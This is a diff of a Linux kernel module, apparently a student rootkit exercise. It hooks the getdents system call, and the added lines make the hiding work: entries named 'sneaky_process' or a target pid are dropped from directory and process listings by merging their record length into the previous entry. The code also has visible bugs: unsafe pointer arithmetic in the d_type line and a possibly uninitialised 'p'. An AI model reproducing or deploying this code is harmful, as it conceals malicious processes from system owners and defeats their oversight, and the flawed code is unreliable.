@@ -65,24 +65,24 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
   //printk(KERN_INFO "sneaky getdents\n");
   int nread = original_getdents(fd, dirp, count);
   struct linux_dirent * d;
-  //struct linux_dirent * p;
+  struct linux_dirent * p;
   int bpos;
   char d_type;
-  int i=0;
+  //int i=0;
   
-  printk(KERN_INFO "nread: %d\n",nread);
-  for(bpos=0; bpos<nread && i<10; bpos+=d->d_reclen,i++){
-    d = (struct linux_dirent *) (dirp + bpos);
-    //d_type = *(char*)(dirp + bpos + d->d_reclen - 1);
-    printk(KERN_INFO "i: %d, bpos: %d, reclen: %d, name: %s\n",i,bpos,d->d_reclen,d->d_name);
+  //printk(KERN_INFO "nread: %d\n",nread);
+  for(bpos=0; bpos<nread; bpos+=d->d_reclen){
+    d = (struct linux_dirent *) ((char*)dirp + bpos);
+    d_type = *(char*)(dirp + bpos + d->d_reclen - 1);
+    //printk(KERN_INFO "i: %d, bpos: %d, reclen: %d, name: %s\n",i,bpos,d->d_reclen,d->d_name);
     if((strcmp(d->d_name, "sneaky_process") == 0) ||
        (strcmp(d->d_name, pid) == 0)){
       printk(KERN_INFO "d->d_name: %s\n", d->d_name);
       //memmove(d, (struct linux_dirent *) (d + d->d_reclen), nread - bpos - d->d_reclen);
       //return nread - d->d_reclen;
-      //p->d_reclen += d->d_reclen; // prev dirent will skip this dirent
+      p->d_reclen += d->d_reclen; // prev dirent will skip this dirent
     }
-    //p=d;
+    p=d;
   }
 
   return nread;
